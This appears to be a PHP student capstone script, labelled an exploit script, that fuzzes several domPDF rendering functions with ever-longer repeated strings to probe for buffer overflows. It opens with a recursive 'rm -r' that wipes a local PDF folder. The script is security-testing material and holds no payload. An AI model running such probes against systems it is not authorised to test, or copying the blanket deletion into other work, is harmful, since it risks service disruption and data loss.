<!-- File: buffer.php -->
<!-- Assignment: MS Capstone -->
<!-- Lanuguage: PHP -->
<!-- Author: Sean Kells <spk3077@rit.edu> -->
<!-- Description: Exploit Script (Buffer Overflow) for domPDF -->
<?php
require_once __DIR__ . '/vendor/autoload.php';
require './php_payloads.php';
use Dompdf\Dompdf;

// Wipe existing PDFs
system("rm -r /var/www/myapp/pdfs/*");
$MAX_COUNT = 10000;

// createPDF function contains the standard process for producing PDFs for all tests
function createPDF() {
    $pdf = new Dompdf();
    $pdf->setPaper('A4', 'landscape');
    $canvas = $pdf->getCanvas();
    $canvas->set_page_count(1);
    $canvas->save();

	return $pdf;
}

// loadHTML
$i = 1;
while ($i < $MAX_COUNT) {
    $pdf = createPDF();

    $pdf->loadHtml(str_repeat("V", $i));
    $pdf->render();

    $output = $pdf->output($options = [0]);
    file_put_contents('/var/www/myapp/pdfs/loadHTML.pdf', $output);
    $i++;
}

// page_text
$i = 1;
while ($i < $MAX_COUNT) {
    $pdf = createPDF();
    $canvas = $pdf->getCanvas();

    $canvas->page_text(20, 20, str_repeat("V", $i), '/var/www/myapp/vendor/dompdf/dompdf/lib/fonts/Courier/', 18);

    $canvas->save();
    $output = $pdf->output($options = [0]);
    file_put_contents('/var/www/myapp/pdfs/page_text.pdf', $output);
    $i++;
}

// Text
$i = 1;
while ($i < $MAX_COUNT) {
    $pdf = createPDF();
    $canvas = $pdf->getCanvas();

    $canvas->text(120, 120, str_repeat("V", $i), '/var/www/myapp/vendor/dompdf/dompdf/lib/fonts/Courier/', 18);

    $canvas->save();
    $output = $pdf->output($options = [0]);
    file_put_contents('/var/www/myapp/pdfs/text.pdf', $output);
    $i++;
}

// Add_Link
$i = 1;
while ($i < $MAX_COUNT) {
    $pdf = createPDF();
    $canvas = $pdf->getCanvas();

    $canvas->add_link(str_repeat("V", $i), 30, 30, 50, 50);

    $canvas->save();
    $output = $pdf->output($options = [0]);
    file_put_contents('/var/www/myapp/pdfs/add_link.pdf', $output);
    $i++;
}

// Add_Info
$i = 1;
while ($i < $MAX_COUNT) {
    $pdf = createPDF();
    $canvas = $pdf->getCanvas();

    $canvas->add_info(str_repeat("V", $i), str_repeat("V", $i));

    $canvas->save();
    $output = $pdf->output();
    file_put_contents('/var/www/myapp/pdfs/add_info.pdf', $output);
    $i++;
}

?>
<h1 style="text-align:center;">Buffer Overflow Testing Complete!</h1>
